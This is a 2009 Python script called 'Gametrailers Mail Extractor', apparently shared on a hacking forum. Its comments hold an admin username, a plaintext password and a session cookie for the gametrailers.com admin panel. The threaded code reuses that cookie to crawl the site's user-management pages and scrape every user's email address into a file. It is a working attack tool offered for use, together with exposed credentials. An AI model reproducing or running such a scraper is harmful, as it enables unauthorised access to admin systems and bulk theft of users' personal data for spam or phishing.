#! /usr/bin/env python3.1
# 23.11.2009 <> 23.11.2009 | cmiN
# Gametrailers Mail Extractor 4 Flubber @ rstcenter.com


import threading, urllib.request, urllib.parse


def main():
    # Site: http://www.gametrailers.com/
    # Aurl: http://admin.gametrailers.com/manager/index.php
    # Username: FiendNinja
    # Password: 59362856
    # Login -> Extract cookie =>
    # Name: mosesuser
    # Content: FiendNinja%3A4f50d469af9c04f884002ab106c331f3
    # Host: admin.gametrailers.com
    try:
        print("Please wait...")
        file = open("mails.txt", "a")
        threads = 10
        timeout = 1000
        url = "http://admin.gametrailers.com/manager/index.php"
        headers = {"Cookie": "mosesuser=FiendNinja%3A4f50d469af9c04f884002ab106c331f3",
                   "Referer": "admin.gametrailers.com",
                   "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0)"}
        letters = ["0-9", "A", "B", "C", "D", "E", "F", "G", "H",
                   "I", "J", "K", "L", "M", "N", "O", "P", "Q",
                   "R", "S", "T", "U", "V", "W", "X", "Y", "Z"]
        for letter in letters:
            while threading.active_count() > threads:
                pass
            Scan(url + "?action=manageusers&letter={}".format(letter), headers, timeout, file).start()
        while threading.active_count() > 1:
            pass
        file.close()
    except Exception as message:
        print("An error occurred: {}".format(message))
    except:
        print("Unknown error.")
    else:
        print("Ready!")
    

class Scan(threading.Thread):

    def __init__(self, url, headers, timeout, file):
        threading.Thread.__init__(self)
        self.url = url
        self.headers = headers
        self.timeout = timeout
        self.file = file

    def run(self):
        request = urllib.request.Request(url=self.url, headers=self.headers)
        with urllib.request.urlopen(url=request, timeout=self.timeout) as usock:
            for line in usock:
                find = b"?action=edituser&id="
                index = line.find(find)
                if not index == -1:
                    page = line[index:]
                    page = page[:page.index(b'"')]
                    newurl = urllib.parse.urljoin(self.url, page.decode())
                    request = urllib.request.Request(url=newurl, headers=self.headers)
                    with urllib.request.urlopen(url=request, timeout=self.timeout) as usock:
                        source = usock.read()
                        find = b'Email:</td><td align="right">'
                        index = source.find(find)
                        if not index == -1:
                            mail = source[index + len(find):]
                            mail = mail[:mail.find(b" <span")]
                            try:
                                self.file.write(mail.decode() + "\n")
                                self.file.flush()
                            except:
                                pass
                

if __name__ == "__main__":
    main()
